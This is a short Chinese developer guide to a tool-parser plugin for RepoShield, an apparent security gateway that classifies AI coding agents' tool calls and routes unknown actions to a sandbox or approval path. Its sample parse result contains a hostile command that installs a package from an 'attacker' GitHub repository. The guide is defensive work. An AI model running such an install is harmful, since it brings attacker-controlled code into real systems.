# Tool Parser Plugin 接入指南

v0.3 的新 agent 接入不需要改 Gateway 主流程，只需要把该 agent 的 tool call 格式映射到 canonical tool。

## 入口

```text
src/reposhield/plugins/registry.py
src/reposhield/plugins/tool_parser.py
src/reposhield/plugins/canonical_tools.py
src/reposhield/plugins/agents/
```

## Canonical tools

```text
read_file
write_file
edit_file
delete_file
bash_exec
git_op
package_op
network_op
mcp_call
memory_read
memory_write
browser_fetch
github_api
ci_cd_op
publish_op
unknown_side_effect
```

## Parser 返回值

```python
ToolParseResult(
    tool_name="terminal",
    canonical_tool="bash_exec",
    instruction_type="EXEC",
    instruction_category="EXECUTION.Env",
    raw_action="npm install github:attacker/helper-tool",
    tool="Bash",
    parser_confidence=0.94,
)
```

## Fail-closed 规则

如果 tool name 或 arguments 无法可靠识别，parser 会返回：

```text
canonical_tool = unknown_side_effect
parser_confidence < 0.5
```

后续 ActionIR 会按 `unknown_side_effect` 进入沙箱/审批路径，而不是默认放行。
